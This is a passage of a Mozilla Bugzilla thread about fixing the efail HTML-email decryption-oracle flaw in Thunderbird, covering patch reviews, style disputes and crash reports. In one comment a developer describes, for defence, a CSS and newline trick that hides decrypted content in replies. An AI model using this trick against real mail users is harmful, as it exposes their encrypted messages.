Compare [comment 63](/show_bug.cgi?id=1419417#c63 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails").

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15607538_22599)• 7 years ago |

Flags: needinfo?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15609320_22599)• 7 years ago |

[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: review-

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15609347_22599)• 7 years ago |

[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Attachment is obsolete: false

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15610037_22599)• 7 years ago |

Depends on: [1463047](/show_bug.cgi?id=1463047 "RESOLVED WORKSFORME - Crash on startup for self-built Thunderbird")

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 159](/show_bug.cgi?id=1419417#c159)• 7 years ago |
|  | |

Ben:
[Attachment #8979120](/attachment.cgi?id=8979120 "Separate MIME parts from each other, v4b (trunk only, with clean-up)") [[details]](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") [[diff]](/attachment.cgi?id=8979120&action=diff "Separate MIME parts from each other, v4b (trunk only, with clean-up)") - Flags: review-
It's your own code cleaned up, so why the r-? By mistake?
All I changed was
- fixed "Context"
- white-space issues
- removed conditional code.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15610803_176914)• 7 years ago |

[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Attachment description: Separate MIME parts from each other, v4 (trunk and 52) → Separate MIME parts from each other, v4 (trunk and 52) - not for landing, but contains code for TB 52 and 60.
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review-

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 160](/show_bug.cgi?id=1419417#c160)• 7 years ago |
|  | |

Comment on [attachment 8979120](/attachment.cgi?id=8979120 "Separate MIME parts from each other, v4b (trunk only, with clean-up)") [[details]](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") [[diff]](/attachment.cgi?id=8979120&action=diff "Separate MIME parts from each other, v4b (trunk only, with clean-up)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979120)
Separate MIME parts from each other, v4b (trunk only, with clean-up)
I think that was by mistake or perhaps due to the white-space changes Ben didn't like. For the record, currently 378 functions don't have a space before the parenthesis, 313 do. So the prevailing style is what this patch does. r- will only confuse Magnus, since the predecessor already had r+ and I fixed the Context issue here, and I'm just checking this is what Magnus meant.
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: review-

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 161](/show_bug.cgi?id=1419417#c161)• 7 years ago |
|  | |

I found the <div> problem.
The superclass parse\_line() function was called correctly. However, in eol(), we called the superclass eof() function - which is what outputs the closing </div> tag - at the \*beginning\* of the child function for HTMLParsed and HTMLSanitized. These classes need to buffer up everything in memory and - due to lacking streaming APIs in Gecko - parse it all at once in eof(), not in parse\_line(). These 2 facts in combination meant that the </div> was output before the actual HTML content. Once I realized that, it was trivial: Move the superclass function call of eof() to the end of the eof() child function, and it works.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 162](/show_bug.cgi?id=1419417#c162)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v5 (for 52)](attachment.cgi?id=8979183&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979183&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979183)

[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Attachment is obsolete: true
[Attachment #8979120](/attachment.cgi?id=8979120&action=edit "Separate MIME parts from each other, v4b (trunk only, with clean-up)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 163](/show_bug.cgi?id=1419417#c163)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v5 (for trunk)](attachment.cgi?id=8979187&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979187&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979187)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 164](/show_bug.cgi?id=1419417#c164)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v5.1 (for trunk)](attachment.cgi?id=8979190&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979190&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190)

[Attachment #8979187](/attachment.cgi?id=8979187&action=edit "Separate MIME parts from each other, v5 (for trunk)") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 165](/show_bug.cgi?id=1419417#c165)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v5.1 (for 52)](attachment.cgi?id=8979192&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979192&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979192)

[Attachment #8979183](/attachment.cgi?id=8979183&action=edit "Separate MIME parts from each other, v5 (for 52)") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 166](/show_bug.cgi?id=1419417#c166)• 7 years ago |
|  | |

Comment on [attachment 8979122](/attachment.cgi?id=8979122 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979122&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122)
1419417-fix-tests.patch (v2)
If these changes appear reasonable, please r+ so we can move forward without waiting for Magnus' next time slot. I'll adjust it to Content-Type later.
[Attachment #8979122](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(ben.bucksch)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 167](/show_bug.cgi?id=1419417#c167)• 7 years ago |
|  | |

Comment on [attachment 8979190](/attachment.cgi?id=8979190 "Separate MIME parts from each other, v5.1 (for trunk)") [[details]](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") [[diff]](/attachment.cgi?id=8979190&action=diff "Separate MIME parts from each other, v5.1 (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190)
Separate MIME parts from each other, v5.1 (for trunk)
Review of [attachment 8979190](/attachment.cgi?id=8979190 "Separate MIME parts from each other, v5.1 (for trunk)") [[details]](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") [[diff]](/attachment.cgi?id=8979190&action=diff "Separate MIME parts from each other, v5.1 (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190):
-----------------------------------------------------------------
Please align the code with mimethsa.cpp. Sadly, I had already done so, but the changes got lost.
I'll put it all together and start a try after lunch.
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +59,5 @@
> + int status = ((MimeObjectClass\*)&MIME\_SUPERCLASS)->parse\_begin(obj);
> + if (status < 0)
> + return status;
> +
> + // charset
Remove that line.
@@ +60,5 @@
> + if (status < 0)
> + return status;
> +
> + // charset
> + // dump the charset we get from the mime headers into a HTML <meta http-equiv>
Sentence/upper case with full stop.
@@ +107,5 @@
> + nsString& rawHTML = \*(me->complete\_buffer);
> + nsString parsed;
> + nsresult rv;
> +
> + // Parse the HTML source
Full stop.
@@ +116,5 @@
> + rawHTML, mozilla::dom::SupportedType::Text\_html, rv2);
> + if (rv2.Failed())
> + return -1;
> +
> + // Serialize it back to HTML source again
and here.
@@ +125,5 @@
> + NS\_ENSURE\_SUCCESS(rv, -1);
> + rv = encoder->EncodeToString(parsed);
> + NS\_ENSURE\_SUCCESS(rv, -1);
> +
> + // Write it out
and here.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 168](/show_bug.cgi?id=1419417#c168)• 7 years ago |
|  | |

Comment on [attachment 8979123](/attachment.cgi?id=8979123 "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[details]](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[diff]](/attachment.cgi?id=8979123&action=diff "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123)
1419417-fix-mimethsa.patch [landed in [bug 1462481 comment #11](/show_bug.cgi?id=1462481#c11 "RESOLVED FIXED - HTML Sanitizer class cleanup")]
Review of [attachment 8979123](/attachment.cgi?id=8979123 "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[details]](/attachment.cgi?id=8979123&action=edit "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[diff]](/attachment.cgi?id=8979123&action=diff "1419417-fix-mimethsa.patch [landed in bug 1462481 comment #11]") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979123):
-----------------------------------------------------------------
I meant to remove the outputting of meta http-equiv here since it looked wrong.
I think it's proof enough if it has been there and with a typo all these years making it a no-op, that my hunch was correct ;)

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 169](/show_bug.cgi?id=1419417#c169)• 7 years ago |
|  | |

Comment on [attachment 8979122](/attachment.cgi?id=8979122 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979122&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122)
1419417-fix-tests.patch (v2)
Review of [attachment 8979122](/attachment.cgi?id=8979122 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979122&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122):
-----------------------------------------------------------------
If this is needed for the tests too be happy, looks reasonable.
Please though Upper-Case the content-type to Content-Type. Lowercase looks so ugly.
[Attachment #8979122](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 170](/show_bug.cgi?id=1419417#c170)• 7 years ago |
|  | |

Comment on [attachment 8979122](/attachment.cgi?id=8979122 "1419417-fix-tests.patch (v2)") [[details]](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") [[diff]](/attachment.cgi?id=8979122&action=diff "1419417-fix-tests.patch (v2)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979122)
1419417-fix-tests.patch (v2)
+ // Account for stuff added by libmime, incl. two CRLF or LF before and after.
+ totalSize += "<meta http-equiv=\"content-type\" content=\"text\/html; \">".length;
+ totalSize += ("@mozilla.org/windows-registry-key;1" in Cc) ? 4 : 2;
I don't think it's good idea to hardcode the number of linebreaks and that "windows-registry-key" test is a hard-to-read and failure-prone way to say "this is Windows".
I would recommend to do what you did in the second test: before calculating the string size, simply remove the <meta> tag (if it exists) - which would still work and not break the test, if we would go back to the old way, which I anticipate - and you can do the same with the LFCR, by simply removing all LF before getting the size.
However, I don't want to be a pain like some other reviewers :-), and I don't care about these tests, so giving you an r+ anyway. I think what I said should be fixed, but it doesn't have to be right now. It's most important to get the fix out.
[Attachment #8979122](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review?(ben.bucksch)
[Attachment #8979122](/attachment.cgi?id=8979122&action=edit "1419417-fix-tests.patch (v2)") -
Flags: review+

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 171](/show_bug.cgi?id=1419417#c171)• 7 years ago |
|  | |

Sorry, I walked over Magnus's r+. You can keep both.
But I second what Magnus said, too.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 172](/show_bug.cgi?id=1419417#c172)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #158](/show_bug.cgi?id=1419417#c158 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> > this is not fixing it for reply/fwd.
>
> Magnus, could you please elaborate?
It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately. It is mitigated quite a bit because you can't(?) that easily hide the decrypted content completely. You can however end the first html part with 100 newlines, or, put <style>\*something matching everything but your content { display:none } </style> inside the first part.
That will blead into the second part to hide the content, and when you reply you will not see it.
If the content is decrypted, we need it marked some way to remove it. I'm not really sure how, because the legitimate use case of replying and quoting an encrypted message should still work of course.
> Compare [comment 63](/show_bug.cgi?id=1419417#c63 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails").
I'm not sure what you're referring to. Prior to 52, composition was doing window->GetDocShell()->SetAppType(nsIDocShell::APP\_TYPE\_EDITOR); This was a major problem that I fixed in [bug 1151366](/show_bug.cgi?id=1151366 "RESOLVED FIXED - File disclosure via covertly imposed attachments in HTML emails").

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15625851_101158)• 7 years ago |

Flags: needinfo?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 173](/show_bug.cgi?id=1419417#c173)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #168](/show_bug.cgi?id=1419417#c168 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> I meant to remove the outputting of meta http-equiv here since it looked
> wrong.
> I think it's proof enough if it has been there and with a typo all these
> years making it a no-op, that my hunch was correct ;)
Well, the charset= part wasn't a no-op, was it? Ben? I'd prefer to leave it in for now.
(In reply to Ben Bucksch (:BenB) from [comment #170](/show_bug.cgi?id=1419417#c170 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> I don't think it's good idea to hardcode the number of linebreaks and that
> "windows-registry-key" test is a hard-to-read and failure-prone way to say
> "this is Windows".
That's pre-existing code, copied again:
<https://dxr.mozilla.org/comm-central/search?q=%40mozilla.org%2Fwindows-registry-key%3B1&redirect=false>

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 174](/show_bug.cgi?id=1419417#c174)• 7 years ago |
|  | |

(In reply to Jorg K (GMT+2) (bustage-fix only, NI for urgent reviews) from [comment #173](/show_bug.cgi?id=1419417#c173 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Well, the charset= part wasn't a no-op, was it? Ben? I'd prefer to leave it
> in for now.
Huh? If it said Context-Type instead of Content-Type it will have been completely ignored.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 175](/show_bug.cgi?id=1419417#c175)• 7 years ago |
|  | |

No, you had:
<meta http-equiv="Context-Type" content="text/html; charset=..."
So perhaps the first part was ignored, not the second. Anyway, I'm leaving it in for now, please file a follow-up. We're running out of time with nit discussions.
I'm going to put it all together right now and start a try.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 176](/show_bug.cgi?id=1419417#c176)• 7 years ago |
|  | |

The charset= is inside the content quote, so it would not make any difference. There's no second part. But sure, do a followup.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 177](/show_bug.cgi?id=1419417#c177)• 7 years ago |
|  | |

Comment on [attachment 8979190](/attachment.cgi?id=8979190 "Separate MIME parts from each other, v5.1 (for trunk)") [[details]](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") [[diff]](/attachment.cgi?id=8979190&action=diff "Separate MIME parts from each other, v5.1 (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190)
Separate MIME parts from each other, v5.1 (for trunk)
Review of [attachment 8979190](/attachment.cgi?id=8979190 "Separate MIME parts from each other, v5.1 (for trunk)") [[details]](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") [[diff]](/attachment.cgi?id=8979190&action=diff "Separate MIME parts from each other, v5.1 (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190):
-----------------------------------------------------------------
The DOM created still has the body outside the <div>. Please use the Inspector inside Dev Tools to see it. So the corresponding code change had no effect. Tested with [attachment 8975458](/attachment.cgi?id=8975458 "A1-dec-pgp-smime-html-reply.eml") [[details]](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml"). I won't mark it r-, but please address this issue.
Also, I re-enabled r? for jorgk again.
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +61,5 @@
> + return status;
> +
> + // charset
> + // dump the charset we get from the mime headers into a HTML <meta http-equiv>
> + char \*content\_type = (obj->headers
As I said a few times before, please remove the superfluous parenthesis.
@@ +63,5 @@
> + // charset
> + // dump the charset we get from the mime headers into a HTML <meta http-equiv>
> + char \*content\_type = (obj->headers
> + ? MimeHeaders\_get(obj->headers, HEADER\_CONTENT\_TYPE, false, false)
> + : 0);
and here.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 178](/show_bug.cgi?id=1419417#c178)• 7 years ago |
|  | |

I came to adjust the test to Content-Type and noticed the following:
Some part of the system still inserts content-type, so in order to get the test to pass, I need to:
replace(/[\n]\*<meta http-equiv="Content-Type" content="text\/html; .\*">[\n]\*/ig, "")
Note the /ig, so ignoring case. Maybe that comes from here:
<https://searchfox.org/mozilla-central/rev/8affe6e83188787eb61fe0528eeb6eef6081ba06/dom/base/nsXHTMLContentSerializer.cpp#378>
However, after taking that first hurdle, the program crashes when running test\_mime\_emitter.js:
nss3.dll!PR\_Assert(const char \* s, const char \* file, int ln) Line 553 C
xul.dll!MimeInlineText\_parse\_end(MimeObject \* obj, bool abort\_p) Line 249 C++
xul.dll!MimeInlineText\_finalize(MimeObject \* obj) Line 179 C++
xul.dll!mime\_free(MimeObject \* object) Line 278 C++
xul.dll!MimeMultipartRelated\_finalize(MimeObject \* obj) Line 244 C++
xul.dll!mime\_free(MimeObject \* object) Line 278 C++
xul.dll!MimeContainer\_finalize(MimeObject \* object) Line 77 C++
xul.dll!mime\_free(MimeObject \* object) Line 278 C++
xul.dll!mime\_display\_stream\_complete(\_nsMIMESession \* stream) Line 955 C++
xul.dll!nsStreamConverter::OnStopRequest(nsIRequest \* request, nsISupports \* ctxt, nsresult status) Line 1050 C++
xul.dll!nsMsgProtocol::OnStopRequest(nsIRequest \* request, nsISupports \* ctxt, nsresult aStatus) Line 389 C++
test\_mime\_attachments\_size.js equally crashes.
So maybe the obvious change of moving the eol() calls around wasn't so obvious.
Ben, if you want to debug it:
mach xpcshell-test --interactive ...
then you can attach the debugger before running the test.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 179](/show_bug.cgi?id=1419417#c179)• 7 years ago |
|  | |

Attached patch

[1419417-fix-tests.patch (v3)](attachment.cgi?id=8979211&action=diff) (obsolete)
— [Details](attachment.cgi?id=8979211&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979211)

Adjusted for Content-Type. Both tests crash with the latest C++ patch.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 180](/show_bug.cgi?id=1419417#c180)• 7 years ago |
|  | |

Looking at the CSS for moz-text-html I didn't find any. So perhaps we return to the previous version of the patch that didn't cause crashes and fix the <div> issue in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") later for both sanitised and parsed/standard HTML? Otherwise we'll be here for a while longer :-(

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 181](/show_bug.cgi?id=1419417#c181)• 7 years ago |
|  | |

That said, the DOM for sanitised HTML being wrong points to some internal problem, so moving this problem onto the main code path for all HTML without understanding it appears a little risky, especially in a dot release 52.8.1.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 182](/show_bug.cgi?id=1419417#c182)• 7 years ago |
|  | |

(In reply to Magnus Melin from [comment #176](/show_bug.cgi?id=1419417#c176 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> The charset= is inside the content quote, so it would not make any
> difference. There's no second part. But sure, do a followup.
Well, I tried the sanitised HTML view which uses similar code and removed writing of the meta tag. I tried in UTF-8 and windows-1252 and the display was still OK. I don't now how Gecko managed that.
The code also generates:
<div class="moz-text-html" lang="x-western"></div> or
<div class="moz-text-html" lang="x-unicode"></div>
which is completely wrong since the lang attribute should have a language tag, like "en-US" or "de-AT" or so. So this area also needs a clean-up sadly.
Filed [bug 1463133](/show_bug.cgi?id=1463133 "RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense").

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 183](/show_bug.cgi?id=1419417#c183)• 7 years ago |
|  | |

> It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately.
Hey Magnus, ah, yes, but that's a completely separate issue, and different fix.
The user can still detect it with the scrollbar etc.
This would be fixed by solution 3 in [comment 57](/show_bug.cgi?id=1419417#c57 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). That's another bug.
> The DOM created still has the body outside the <div>
I've looked at the raw libmime output and the Dev Tools, and the <div> is around the HTML email. I'll attach a screenshot.
I've used a real HTML mail as test. Pay attention when using the attack emails here for testing, because they have empty HTML documents, so they can be easily confusing when used for verification.
Also, make sure that you have Original HTML on, not Sanitized HTML. I've been tripped by that once during my dev, too.
> perhaps we return to the previous version of the patch that didn't cause crashes and fix the <div>
> issue in [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") later for both sanitised and parsed/standard HTML? Otherwise we'll be here for a while longer :-(
Yes, given that the main concrete effect of the <div> is the missing margin of the separator, I think that's tolerable. We can still fix it in a later 52.9.0 or 60 release, if need be.
I'm for shipping the fix as I had it last Wednesday, that worked and fixed the security bug.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 184](/show_bug.cgi?id=1419417#c184)• 7 years ago |
|  | |

> lang="x-unicode" ... is completely wrong ... should have a language tag, like "en-US"... So this area also needs a
> clean-up sadly.
Please be careful. If you look at Firefox Preferences Font dialog, you see that it mixes languagues with "Unicode". If you look in browser/components/preferences/fonts.xul, it actually uses "x-unicode" for what's now called "Other languages" in the UI, and "x-western" also exists and is called "Latin" in the Firefox Font UI. So that code is actually perfectly correct for Gecko. And that's the point here, to pick the right font family for display. So, please don't be presumptuous in judging and esp. modifying that code. Like a grandfather, libmime is old code, and it's not perfect, but it does work. Be careful before dismissing it, you might really break stuff.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 185](/show_bug.cgi?id=1419417#c185)• 7 years ago |
|  | |

Attached image
[<div> is correctly wrapping the HTMl email, with patch v5.\*](attachment.cgi?id=8979245)
— [Details](attachment.cgi?id=8979245&action=edit)

> I tried the sanitised HTML view which
...could explain why you still see the <div> in the wrong place, because you applied the patch here and not the Sanitizer one which you asked me to separate out to [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>"), and if you enabled Sanitized HTML, that means that you wouldn't even use the HTML Parsed class, and would not see the effects of the fix here.
Also, again, please try with real HTML emails, not just the attack emails here.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 186](/show_bug.cgi?id=1419417#c186)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #184](/show_bug.cgi?id=1419417#c184 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
Sorry Ben, you're confused here. I'm quite aware of encodings and writing systems and how Gecko tries to derive one from the other. Further reading in [bug 1228193 comment #10](/show_bug.cgi?id=1228193#c10 "NEW - UX problem selecting font for UTF-8 encoded plain text mail (see comment #8)").
Unicode (UTF-8) and Western (windows-1252) in the |View > Text Encoding| menu are encodings. "x-unicode" (Other Languages) and "x-western" (Latin) are writing systems. Language is something different, but language maps to writing system.
<https://dxr.mozilla.org/mozilla-central/source/intl/locale/langGroups.properties>
Stuffing a writing system into the lang attribute seems 100% wrong, but let's discuss this in [bug 1463133](/show_bug.cgi?id=1463133 "RESOLVED FIXED - Investigate whether writing a meta tag in mimethsa.cpp is needed and whether writing lang=x-unicode in mimethtm.cpp makes any sense").

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 187](/show_bug.cgi?id=1419417#c187)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #185](/show_bug.cgi?id=1419417#c185 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Also, again, please try with real HTML emails, not just the attack emails
> here.
Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.
The message from [attachment 8979247](/attachment.cgi?id=8979247 "multi-html.eml") [[details]](/attachment.cgi?id=8979247&action=edit "multi-html.eml") only shows horizontal lines. So sorry, your patch doesn't work at all.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 188](/show_bug.cgi?id=1419417#c188)• 7 years ago |
|  | |

Attached file
[test with image for attaching bug.eml](attachment.cgi?id=8979258)
— [Details](attachment.cgi?id=8979258&action=edit)

Ben, viewing this message crashes. Please try a few "normal" HTML messages. This one is multi-part related. It crashes in original HTML and sanitised. I have the C++ patch here and the one from [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") applied.
As mentioned, the Xpcshell tests also crash. Frankly, I'm tired, I've tried stuff all day. libmime isn't as brilliant as you said, you poke it, and it breaks :-(

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 189](/show_bug.cgi?id=1419417#c189)• 7 years ago |
|  | |

Comment on [attachment 8979190](/attachment.cgi?id=8979190 "Separate MIME parts from each other, v5.1 (for trunk)") [[details]](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") [[diff]](/attachment.cgi?id=8979190&action=diff "Separate MIME parts from each other, v5.1 (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8979190)
Separate MIME parts from each other, v5.1 (for trunk)
This causes crashes and obliterates previously working display of HTML messages.
Please re-submit when working. Ideally, as the assignee, do a try push and also run the tests manually.
[Attachment #8979190](/attachment.cgi?id=8979190&action=edit "Separate MIME parts from each other, v5.1 (for trunk)") -
Flags: review-

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 190](/show_bug.cgi?id=1419417#c190)• 7 years ago |
|  | |

> Please re-submit when working.
I'm done here. I've been working on this since almost a week, more than full time, and most of that on the review and building various branches. I'm seriously neglecting my job.
> Ben, with the latest patch, viewing HTML messages just crashes, also seen in the test crashes.
Like I said, trunk without any changes crashes for me on startup, so I can't do anything for trunk.
